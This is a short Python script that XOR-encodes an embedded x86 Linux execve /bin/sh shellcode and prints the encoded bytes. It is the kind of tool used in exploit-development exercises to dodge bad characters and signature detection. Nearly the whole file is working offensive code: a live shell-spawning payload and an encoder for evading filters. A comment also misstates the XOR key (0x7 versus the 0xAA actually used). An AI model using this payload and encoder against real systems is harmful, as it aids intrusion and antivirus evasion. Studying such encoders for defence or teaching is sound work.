#!/usr/bin/python3

# Python XOR Shellcode Encoder

import random

shellcode = bytearray(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

def encode(shellcode):

        encoded = ""
        encoded2 = ""

        print("[*] Encoded shellcode:")

        for x in shellcode:

                # XOR x with 0x7
                y = x ^ 0xAA
                encoded += '\\x'
                encoded += '%02x' % y

                encoded2 += '0x'
                encoded2 += '%02x,' % y

        return encoded, encoded2

def main():

        encoded, encoded2 = encode(shellcode)
        print(','.join(encoded2.split(','))[:-1])

if __name__ == "__main__":
        main()
